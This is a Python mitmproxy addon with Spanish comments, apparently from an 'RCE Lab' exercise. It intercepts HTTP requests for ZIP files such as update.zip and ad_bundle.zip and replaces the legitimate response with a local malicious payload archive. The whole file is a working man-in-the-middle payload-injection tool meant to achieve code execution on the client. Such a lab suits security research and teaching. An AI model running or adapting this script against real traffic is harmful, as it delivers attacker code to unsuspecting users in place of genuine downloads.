#!/usr/bin/env python3
"""
mitmproxy script para interceptar y modificar peticiones de la app RCE Lab
Intercepta peticiones a archivos ZIP y responde con payload malicioso
"""

import os
from mitmproxy import http, ctx
from pathlib import Path

class PayloadInjector:
    def __init__(self):
        self.script_dir = Path(__file__).parent
        self.payload_path = self.script_dir.parent / "payload" / "build" / "payload.zip"
        self.evil_zip_path = self.script_dir / "evil.zip"
        
        # URLs que queremos interceptar (cualquier archivo ZIP)
        self.target_urls = [
            "payload.zip",
            "ad_bundle.zip", 
            "video.zip",
            "content.zip",
            "update.zip"
        ]
        
        ctx.log.info(f"🎯 PayloadInjector inicializado")
        ctx.log.info(f"📦 Payload path: {self.payload_path}")
        
    def request(self, flow: http.HTTPFlow) -> None:
        """Interceptar peticiones"""
        request_url = flow.request.pretty_url
        
        # Verificar si es una petición que queremos interceptar
        if any(target in request_url for target in self.target_urls):
            ctx.log.info(f"🔍 Interceptando petición: {request_url}")
            
            # Marcar el flow para modificar la respuesta
            flow.metadata["inject_payload"] = True
        
    def response(self, flow: http.HTTPFlow) -> None:
        """Modificar respuestas"""
        if flow.metadata.get("inject_payload"):
            ctx.log.warn(f"🚨 INYECTANDO PAYLOAD en respuesta a: {flow.request.pretty_url}")
            
            # Verificar que tenemos el payload
            if not self.payload_path.exists():
                ctx.log.error(f"❌ Payload no encontrado: {self.payload_path}")
                return
                
            # Leer el payload malicioso
            try:
                with open(self.payload_path, 'rb') as f:
                    malicious_content = f.read()
                
                # Modificar la respuesta
                flow.response.status_code = 200
                flow.response.headers["Content-Type"] = "application/zip"
                flow.response.headers["Content-Length"] = str(len(malicious_content))
                flow.response.content = malicious_content
                
                ctx.log.error(f"💀 PAYLOAD INYECTADO - Tamaño: {len(malicious_content)} bytes")
                ctx.log.error(f"🎯 Cliente recibirá payload malicioso en lugar del contenido legítimo")
                
            except Exception as e:
                ctx.log.error(f"❌ Error inyectando payload: {e}")

# Instanciar el addon
addons = [PayloadInjector()] 